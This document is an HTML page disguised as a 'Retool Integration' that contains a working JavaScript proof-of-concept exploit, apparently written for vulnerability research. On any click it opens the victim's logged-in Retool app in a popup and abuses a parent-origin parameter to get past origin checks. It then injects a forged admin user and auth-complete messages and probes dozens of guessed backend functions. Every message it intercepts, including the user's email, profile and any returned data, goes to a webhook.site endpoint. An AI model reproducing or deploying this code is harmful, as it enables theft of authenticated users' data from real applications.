<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Retool Integration</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .box { background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 32px 40px; text-align: center; max-width: 520px; }
  .spinner { width: 32px; height: 32px; border: 3px solid #e2e8f0; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  h2 { font-size: 16px; color: #1e293b; margin-bottom: 6px; }
  p { font-size: 13px; color: #64748b; }
  #log { margin-top: 16px; font-size: 11px; color: #94a3b8; max-height: 150px; overflow-y: auto; text-align: left; font-family: monospace; background: #f8fafc; border-radius: 4px; padding: 8px; }
  .log-line { padding: 2px 0; border-bottom: 1px solid #f1f5f9; word-break: break-all; }
  .good { color: #16a34a; font-weight: bold; }
  .warn { color: #d97706; }
</style>
</head>
<body>
<div class="box">
  <div class="spinner" id="spin"></div>
  <h2 id="msg">Open popup window</h2>
  <p id="sub">The retool app will open in a new window</p>
  <div id="log"></div>
</div>

<script>
(function() {
  'use strict';

  var WH = 'https://webhook.site/40e12f3f-6c20-4215-b822-92194f6cc88a';
  var ATK = location.origin;
  var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
  var HOST = 'https://jonjos11.retool.com';

  // Use retool-parent-origin to bypass origin checks
  var APP_URL = HOST + '/apps/' + APP_ID + '/asa/defaultPage?retool-parent-origin=' + encodeURIComponent(ATK);
  var popupRef = null;

  function X(payload) {
    var j = JSON.stringify(payload);
    if (navigator.sendBeacon) {
      navigator.sendBeacon(WH, new Blob([j], { type: 'text/plain' }));
    }
    new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0, 1500));
  }

  function addLog(msg, cls) {
    console.log('[PoC]', msg);
    var el = document.getElementById('log');
    var line = document.createElement('div');
    line.className = 'log-line' + (cls ? ' ' + cls : '');
    line.textContent = msg;
    el.appendChild(line);
    el.scrollTop = el.scrollHeight;
  }

  function uid() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      var r = Math.random()*16|0, v = c==='x'?r:(r&0x3|0x8);
      return v.toString(16);
    });
  }

  var pendingRequests = {};

  // ================================================================
  // ATTACK: window.open() the retool app
  // Popup has first-party cookie access → user IS authenticated
  // We postMessage into the popup → editor forwards to runtime
  // Runtime's no-origin-check handlers process our messages
  // ================================================================
  function launchPopup() {
    popupRef = window.open(APP_URL, 'retoolWin', 'width=1200,height=800,left='+((screen.width-1200)/2)+',top='+((screen.height-800)/2));

    if (!popupRef) {
      addLog('Popup blocked! Click to allow.', 'warn');
      return false;
    }

    addLog('Popup opened — app has real session', 'good');
    X({ event: 'popup_opened', url: APP_URL, time: new Date().toISOString() });

    // Step 1: Wait for app to load, then request user data
    setTimeout(function() {
      if (!popupRef || popupRef.closed) return;
      addLog('Phase 1: Requesting user data...');
      try {
        popupRef.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
      } catch(e) {}
    }, 5000);

    // Step 2: Inject fake user with webhook beacon in profilePhotoUrl
    // This confirms our data is being used by the runtime
    setTimeout(function() {
      if (!popupRef || popupRef.closed) return;
      addLog('Phase 2: Injecting user with beacon...');
      var beaconId = 'beacon-' + Date.now();
      try {
        popupRef.postMessage({
          type: 'RETOOL_CURRENT_USER',
          data: {
            id: 1,
            email: 'probe@attacker.com',
            firstName: 'Probe',
            lastName: 'User',
            fullName: 'Probe User',
            profilePhotoUrl: WH + '?beacon=' + beaconId + '&type=profile_photo_loaded',
            groups: [{ id: 1, name: 'admin' }, { id: 2, name: 'superuser' }],
            metadata: { _beacon: beaconId, _attacker: ATK },
            sid: 'inj-' + Date.now(),
            externalIdentifier: null,
            locale: 'en'
          }
        }, '*');
      } catch(e) {}
    }, 8000);

    // Step 3: Auth bypass
    setTimeout(function() {
      if (!popupRef || popupRef.closed) return;
      try {
        popupRef.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
      } catch(e) {}
    }, 9000);

    // Step 4: Probe backend functions with real function name patterns
    // We try many variants since we don't know the exact names
    setTimeout(function() {
      if (!popupRef || popupRef.closed) return;
      addLog('Phase 3: Probing backend functions...');

      var probes = [
        // User
        'getCurrentUser','get_user','getUser','currentUser','me','getMe',
        'getProfile','userProfile','getCurrentUserId','get_user_info',
        'getUserInfo','fetchUser','fetch_user','current_user','user',
        // Organization
        'getOrganization','get_organization','getOrg','getCurrentOrg',
        'fetchOrganization','organization','getOrgUsers','listUsers',
        'getOrganizationUsers','fetchUsers','orgUsers','org_users',
        // App data
        'getAppData','getData','fetchData','loadData','getInitialData',
        'getPageData','getTableData','getRecords','fetchRecords',
        // Common patterns
        'query1','query_1','getQuery1','runQuery1','api1','get_api',
        'readData','read_data','getRows','get_rows','listRecords',
        'getItems','get_items','fetchItems','fetch_items',
        // Settings/config
        'getConfig','get_config','getSettings','get_settings',
        'appSettings','app_settings','getAppSettings',
      ];

      var i = 0;
      var batchInterval = setInterval(function() {
        if (!popupRef || popupRef.closed) {
          clearInterval(batchInterval);
          return;
        }
        if (i >= probes.length) {
          clearInterval(batchInterval);
          addLog('All ' + probes.length + ' probes sent');
          X({ event: 'probes_complete', count: probes.length, time: new Date().toISOString() });
          return;
        }

        for (var j = 0; j < 3 && i < probes.length; j++, i++) {
          var reqId = uid();
          pendingRequests[reqId] = probes[i];
          try {
            popupRef.postMessage({
              type: 'RETOOL_BACKEND_FUNCTION',
              requestId: reqId,
              functionName: probes[i],
              params: {}
            }, '*');
          } catch(e) {}
        }
      }, 400);
    }, 12000);

    // Monitor popup
    var monitor = setInterval(function() {
      if (!popupRef || popupRef.closed) {
        clearInterval(monitor);
        addLog('Popup closed');
        X({ event: 'popup_closed', pendingCount: Object.keys(pendingRequests).length, time: new Date().toISOString() });

        // If we have pending requests that never got responses, report them
        var pendingNames = {};
        for (var rid in pendingRequests) {
          var name = pendingRequests[rid];
          pendingNames[name] = (pendingNames[name] || 0) + 1;
        }
        X({ event: 'unresolved_probes', pending: pendingNames, time: new Date().toISOString() });
        return;
      }
    }, 2000);

    return true;
  }

  // ================================================================
  // INTERCEPT ALL postMessages
  // ================================================================
  window.addEventListener('message', function(e) {
    var d = e.data;
    if (!d || typeof d !== 'object' || !d.type) return;

    var fromPopup = false;
    try {
      fromPopup = popupRef && (e.source === popupRef);
    } catch(ex) {}

    var dir = fromPopup ? '←RECV' : '→SENT';
    var summary = '';

    if (d.type === 'RETOOL_CURRENT_USER' && d.data) {
      summary = ' email=' + (d.data.email || '?') + ' name=' + (d.data.fullName || '?') +
                ' groups=' + JSON.stringify((d.data.groups || []).map(function(g){return g.name;}));
      if (fromPopup && d.data.email && d.data.email.indexOf('probe@') === -1 && d.data.email.indexOf('xss-probe@') === -1) {
        addLog('REAL USER DATA: ' + d.data.email + ' (' + d.data.fullName + ')', 'good');
        document.getElementById('msg').textContent = 'REAL USER DATA CAPTURED!';
        document.getElementById('sub').textContent = d.data.email;
        document.getElementById('spin').style.display = 'none';
        X({ event: 'REAL_USER_DATA', userData: d.data, time: new Date().toISOString() });
      }
    } else if (d.type === 'RETOOL_BACKEND_RESULT') {
      var reqFn = d.requestId && pendingRequests[d.requestId];
      if (reqFn) {
        summary = ' fn=' + reqFn + ' — DATA CAPTURED!';
        delete pendingRequests[d.requestId];
        addLog('BACKEND RESULT: ' + reqFn + ' returned data!', 'good');
        X({
          event: 'BACKEND_RESULT',
          functionName: reqFn,
          requestId: d.requestId,
          data: d.data,
          time: new Date().toISOString()
        });
      } else {
        summary = ' unknown requestId=' + (d.requestId || '?').slice(0,8);
      }
    } else if (d.type === 'RETOOL_CURRENT_USER_REQUEST') {
      summary = ' (app needs user data)';
      if (fromPopup) addLog('App is asking for user — needs parent to provide it', 'warn');
    } else if (d.type === 'RETOOL_BACKEND_FUNCTION') {
      summary = ' fn=' + (d.functionName || '?');
      if (fromPopup) addLog('Backend call from app: ' + (d.functionName || '?'), 'good');
    } else if (d.type === 'RR_OAUTH_RESOURCE') {
      summary = ' resource=' + (d.resourceName || '?');
    }

    addLog(dir + ' ' + d.type + summary, fromPopup && (d.type === 'RETOOL_BACKEND_RESULT' || (d.type === 'RETOOL_CURRENT_USER' && d.data && d.data.email && d.data.email.indexOf('probe@') === -1)) ? 'good' : '');

    X({
      event: 'postmessage',
      direction: dir,
      type: d.type,
      data: d,
      origin: e.origin,
      time: new Date().toISOString()
    });
  });

  // ================================================================
  // START — auto-launch popup on click
  // ================================================================
  document.getElementById('msg').textContent = 'Ready';
  document.getElementById('sub').textContent = 'Click anywhere to launch';
  document.getElementById('spin').style.display = 'none';
  addLog('PoC ready. Click to open retool popup.');

  // Track if we've already attempted
  var launched = false;

  document.body.addEventListener('click', function() {
    if (launched) return;
    launched = true;

    document.getElementById('msg').textContent = 'Attacking...';
    document.getElementById('sub').textContent = 'Popup opened — check webhook';
    document.getElementById('spin').style.display = 'block';

    X({ event: 'attack_start', attacker: ATK, host: HOST, appId: APP_ID, url: APP_URL, time: new Date().toISOString() });

    if (!launchPopup()) {
      // Popup blocked — wait for next click
      launched = false;
      document.getElementById('msg').textContent = 'Popup blocked';
      document.getElementById('sub').textContent = 'Enable popups and click again';
      document.getElementById('spin').style.display = 'none';
    }
  });

  X({ event: 'page_load', url: location.href, referrer: document.referrer, ua: navigator.userAgent, time: new Date().toISOString() });

})();
</script>
</body>
</html>
